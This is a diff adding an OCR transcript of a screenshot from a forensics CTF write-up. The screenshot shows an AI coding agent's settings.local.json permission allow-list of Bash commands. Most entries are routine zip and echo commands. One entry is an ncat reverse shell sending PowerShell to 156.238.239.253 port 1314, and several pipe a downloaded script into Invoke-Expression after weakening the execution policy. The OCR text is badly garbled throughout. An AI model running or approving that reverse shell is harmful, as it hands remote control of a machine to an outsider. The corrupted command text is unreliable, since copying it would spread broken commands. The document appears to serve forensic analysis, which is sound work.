@@ -1,0 +1,32 @@
+# OCR: Pasted_image_20260415214443.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260415214443.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:44
+
+settings.local.json X
+[settings.local.json>(]permissions>[]allow
+'permissions":↓"allow":-
+"Websearch"
+"Bash(echo:*)""Bash(cd:*)"
+"Bash(Compress-Archive -Path \"海母牛公司年度汇报.docx/*}"-DestinationPath {"海母牛公司年度汇报.docx.zip\"-Force)"
+"Bash(python3 -c "import zipfile; import os; zf = zipfile.ZipFilel(海母牛公司年度汇报.docx.zip'·
+·‘w'，zipfile.ZIP_DEFLATED\)； for root，dirs，files in os.walkl(海母牛公司年度汇报.docx'{)：for file
+in files: zf.writel(os.path.joinl(root, filel), os.path.join(root, filel)): zf.closelh(): os. renamel（海母牛公司年度汇报.docx.zip"，·海母牛公司年度汇报.docx')")"
+0 10 11
+12 13
+14 15 16 18
+"Bash(powershell
+-Command
+1"Invoke-RestMethod-Urihttps://get.scoop.sh/Invoke-Expressionl")"
+"Bash(ncat.exe 156.238.239.253 1314 -e powershel1)",
+Basnupowersnel
+E0a
+kemotesigned -Scope Currentuser -Force; Invoke-RestMethod
+Xectopoc
+Uri https://get.scoop.sh/ Invoke-Expressionl")"
+"Bash(powershell -Command 1"Test-NetConnection get.scoop.sh -Port 443 I Select-object ComputerName, RemoteAddress,TcpTestsucceededy")"
+"Bash(powershell -Command 1"[Net.ServicePointManager]: :SecurityProtocol = [Net.SecurityProtocolType]
+::Tls12; Set-ExecutionPolicy Remotesigned -Scope CurrentUser -Force; Invoke-RestMethod -Uri https://get. scoop.shInvoke-Expressiony")"
+"Bash(powershell-Command"[Net.ServicePointManager]::SecurityProtocol =[Net.SecurityProtocolType]
+::Tls12; Set-ExecutionPolicy Remotesigned -Scope CurrentUser -Force; Invoke-RestMethod -Uri http://get.
+scoop.sh I Invoke-Expression!")","Bash(curl --version)"
